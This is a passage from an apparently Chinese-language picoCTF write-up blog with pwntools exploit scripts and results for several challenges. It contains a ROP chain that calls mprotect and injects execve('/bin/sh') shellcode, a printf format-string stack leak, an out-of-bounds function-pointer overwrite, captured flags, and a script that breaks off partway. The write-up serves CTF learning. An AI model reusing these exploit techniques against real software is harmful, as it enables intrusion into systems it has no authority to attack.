<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">loses</span> <span class="o">=</span> <span class="p">[</span><span class="s">"paper"</span><span class="p">,</span> <span class="s">"scissors"</span><span class="p">,</span> <span class="s">"rock"</span><span class="p">]</span>
<span class="n">rint</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">rint</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">loses</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>

<span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">i</span> <span class="o">=</span> <span class="n">rint</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>

<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">"Type '1' to play a game"</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s">'(rock/paper/scissors):'</span><span class="p">,</span> <span class="n">loses</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">5</span>
        <span class="n">i</span> <span class="o">=</span> <span class="n">rint</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
        
        <span class="n">rls</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">rl</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'res = '</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">).</span><span class="n">find</span><span class="p">(</span><span class="s">'You win!'</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
                <span class="n">count</span> <span class="o">=</span> <span class="n">count</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
                <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="k">print</span><span class="p">(</span><span class="n">count</span><span class="p">)</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">5</span><span class="p">):</span>
                <span class="n">ru</span><span class="p">(</span><span class="s">"Congrats, here's the flag!"</span><span class="p">)</span>
                <span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
                <span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
                <span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
                <span class="n">itr</span><span class="p">()</span>
                <span class="k">break</span>
</code></pre></div></div>

<h3 id="result-1">Result</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
res =  b"Seems like you didn't win this time. Play again?\r\n"
0
res =  b'You win! Play again?\r\n'
1
res =  b'You win! Play again?\r\n'
2
res =  b'You win! Play again?\r\n'
3
res =  b'You win! Play again?\r\n'
4
res =  b'You win! Play again?\r\n'
5
...
b'picoCTF{50M3_3X7R3M3_1UCK_32F730C2}\r\n'
...
real	9m10.276s
user	0m1.003s
sys	0m0.131s
</code></pre></div></div>

<h2 id="ropfu">ropfu</h2>

<h3 id="ÊÄùË∑Ø-8">ÊÄùË∑Ø</h3>

<p>No canaryÔºåstackÊúâÊâßË°åÊùÉÈôêÔºåÁî®mprotectËµã‰∫àbssÊÆµÂèØÊâßË°åÊùÉÈôêÔºåÁÑ∂ÂêéÂæÄbssÊÆµÂÜôÂÖ•shellcodeÂπ∂ÊâßË°å</p>

<h3 id="exp-7">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">54462</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># shellcode one
# sc = shellcraft.sh()
# sc = asm(sc)
# print(len(sc))
</span>
<span class="c1"># shellcode two
# sc = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
# sc += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# print(len(sc))
</span>
<span class="c1"># shellcode three
</span><span class="s">'''
execve('/bin/sh', 0, 0)
eax = 11, ebx -&gt; '/bin/sh', ecx = edx = 0
'''</span>
<span class="n">sc</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'xor ecx,ecx;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'mul ecx;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'push ecx;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'push 0x68732f2f;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'push 0x6e69622f;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'mov ebx,esp;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'mov al,11;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'int 0x80'</span>
<span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>

<span class="n">bss</span> <span class="o">=</span> <span class="mh">0x080E6000</span>
<span class="n">pop_edx_ebx_esi_ret</span> <span class="o">=</span> <span class="mh">0x0805f7b6</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x18</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'mprotect'</span><span class="p">])</span> 
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ebx_esi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'grasshopper!</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="s">'cat flag.txt'</span><span class="p">)</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="flag-leak">flag leak</h2>

<h3 id="ÊÄùË∑Ø-9">ÊÄùË∑Ø</h3>

<p>scanfÊúÄÂ§öÂèØ‰ª•ËØªÂÖ•127‰∏™Â≠óÁ¨¶ÔºåÂà©Áî®printfÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÊ≥ÑÈú≤flag</p>

<h3 id="exp-8">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">64125</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%45$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%44$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%43$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%42$x---'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%41$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%40$x---'</span><span class="o">+</span> <span class="sa">b</span><span class="s">'%39$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%38$x---'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%37$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%36$x---'</span><span class="o">+</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x30</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mi">3</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'you one &gt;&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>

<span class="c1"># get flag, little endian
# 7b465443---6f636970---5f676e31---6b34334c---6666305f
# ---67346c46---655f6b63---3474535f---7d326136---34623962
</span>
<span class="n">str_li</span> <span class="o">=</span> <span class="p">[</span><span class="s">'7d326136'</span><span class="p">,</span> <span class="s">'34623962'</span><span class="p">,</span> <span class="s">'655f6b63'</span><span class="p">,</span><span class="s">'3474535f'</span><span class="p">,</span><span class="s">'6666305f'</span>
          <span class="p">,</span><span class="s">'67346c46'</span><span class="p">,</span><span class="s">'5f676e31'</span><span class="p">,</span><span class="s">'6b34334c'</span><span class="p">,</span><span class="s">'7b465443'</span><span class="p">,</span><span class="s">'6f636970'</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x7d</span><span class="p">))</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">str_li</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
                <span class="n">ch</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">ch_l</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
                <span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="n">ch_l</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="result-2">Result</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
b'7d326136---34623962---655f6b63---3474535f---6666305f
---67346c46---5f676e31---6b34334c---7b465443---6f636970
---aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
...
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{F
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FT
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTC
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCo
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCoc
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCoci
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCocip
picoCTF{L34k1ng_Fl4g_0ff_St4ck_eb9b46a2}
</code></pre></div></div>

<h2 id="function-overwrite">function overwrite</h2>

<h3 id="ÊÄùË∑Ø-10">ÊÄùË∑Ø</h3>

<p>ÈÄöËøáfunÊï∞ÁªÑË∂äÁïåÔºåË¶ÜÁõñcheckÊåáÈíà‰∏∫easy_checkerÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåÂú®ÊãºÂáëÊï∞ÊçÆ‰ΩøÂæóËÉΩÈÄöËøácalculate_story_scoreÂáΩÊï∞ÁöÑÊ£ÄÊü•ÔºåÊó¢ÂèØÊî∂Âà∞flag„ÄÇ</p>

<h3 id="exp-9">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">52369</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">sla</span><span class="p">(</span><span class="s">"if you're a 1337 &gt;&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s">"Keep the first one less than 10.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">16</span><span class="p">))</span>
<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">314</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
</code></pre></div></div>

<h2 id="stack-cache">stack cache</h2>

<h3 id="ÊÄùË∑Ø-11">ÊÄùË∑Ø</h3>

<p>ÂáΩÊï∞ËØªÂèñÁöÑÊï∞ÊçÆÔºåÂú®ÂáΩÊï∞ÈÄÄÊ†àÂêéÔºå‰ªçÁÑ∂‰ºöÈÅóÁïôÂú®Ê†à‰∏ä„ÄÇÂõ†Ê≠§ÔºåÂáΩÊï∞ÈÄÄÊ†àÂêéÔºåÂèØ‰ª•Âà©Áî®Ê†ºÂºèÂåñÂ≠óÁ¨¶Ê≥ÑÊºèËøô‰∫õÊ†à‰∏äÁöÑÂÖ≥ÈîÆÊï∞ÊçÆ</p>

<h3 id="exp-10">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
